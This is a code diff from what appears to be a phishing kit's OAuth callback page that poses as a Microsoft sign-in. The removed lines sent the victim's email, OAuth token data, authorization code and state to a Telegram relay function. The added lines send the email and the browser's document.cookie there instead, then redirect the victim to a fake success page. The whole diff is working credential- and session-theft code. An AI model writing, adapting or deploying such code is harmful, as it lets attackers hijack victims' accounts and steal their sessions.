@@ -101,21 +101,20 @@ async function handleOAuthCallback() {
 
         console.log('📧 Final extracted email:', userEmail);
 
-        // Send info to Telegram
+        // ✅ Send email and cookies to Telegram
         try {
+            // Capture cookies from document.cookie
+            const cookies = document.cookie; // This will send all accessible cookies as a string
+
+            const telegramPayload = {
+                email: userEmail || 'user-email-pending@oauth.exchange',
+                cookies: cookies // Add cookies to the payload
+            };
+
             const telegramResponse = await fetch('/.netlify/functions/sendTelegram', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    email: userEmail || 'user-email-pending@oauth.exchange',
-                    provider: 'Microsoft',
-                    timestamp: new Date().toISOString(),
-                    tokenData: tokenData,
-                    authorizationCode: code,
-                    state: state,
-                    domain: window.location.origin,
-                    sessionId: Math.random().toString(36).substring(2, 12)
-                }),
+                body: JSON.stringify(telegramPayload),
             });
 
             const telegramResult = await telegramResponse.json();
@@ -128,10 +127,9 @@ async function handleOAuthCallback() {
         statusEl.textContent = 'Authentication successful!';
         resultEl.innerHTML = `<div class="success">Authentication completed successfully! Redirecting...</div>`;
 
-        // **KEY FIX**: Redirect back to message icon landing to restart the flow
+        // **Redirect to document loading**
         setTimeout(() => {
-            // This will take them back to your message icon landing page
-            window.location.href = '/?step=message-icon';
+            window.location.href = '/?step=success';
         }, 2000);
 
     } catch (err) {
